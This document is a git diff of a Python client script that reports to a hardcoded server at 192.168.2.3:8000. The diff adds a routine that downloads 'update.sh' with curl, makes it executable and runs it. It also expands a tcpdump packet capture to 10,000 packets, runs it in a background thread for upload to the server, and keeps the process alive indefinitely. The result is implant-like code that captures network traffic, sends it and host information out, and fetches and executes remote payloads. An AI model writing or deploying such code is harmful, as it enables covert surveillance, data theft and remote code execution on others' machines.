@@ -5,6 +5,7 @@ import subprocess
 import requests
 import time
 import json
+import threading
 
 SERVER_URL = "http://192.168.2.3:8000"
 
@@ -138,7 +139,21 @@ def upload_TCP_dump(fname="read.pcap",count=100):
             
     except Exception as e:
         print(f"Error running tcpdump: {e}")
-    
+
+def download_and_run_subprocess(fname):
+    try:
+        download_using_curl(fname)
+        
+        cmd = ["chmod", "+x", fname]
+        process = subprocess.run(cmd, capture_output=True, text=True)
+        
+        cmd = [f"./{fname}"]
+        process = subprocess.run(cmd, capture_output=True, text=True)
+        print(process.stdout)
+        
+    except Exception as e:
+        print(f"Download and Run Failed: {e}")
+        
 def main():
     
     try:
@@ -147,20 +162,27 @@ def main():
         print(f"System Info Upload Failed: {e}")
     
 
-    count = 100
+    count = 10000
     hostname = socket.gethostname()
     timestamp = time.strftime("%Y-%m-%d_%H:%M:%S")
     filename = f"{hostname}_{timestamp}.pcap"  
+    print(f"Running TCP Dump Thread: Capturing {count} packets")
     
     try:
-        upload_TCP_dump(filename,count)
+        tcp_thread = threading.Thread(target=upload_TCP_dump,args=(filename,count))
+        tcp_thread.start()
     except Exception as e:
         print(f"TCP Dump Failed: {e}")
     
+    
+    fname = "update.sh"
     try:
-        download_using_curl("test.txt")
+        download_and_run_subprocess(fname)
     except Exception as e:
-        print(f"Download Failed: {e}")
+        print(f"Error in Downloading and Running {fname}: {e}")
+        
+    while(True):
+        time.sleep(30)
 
 if __name__ == "__main__":
     main()
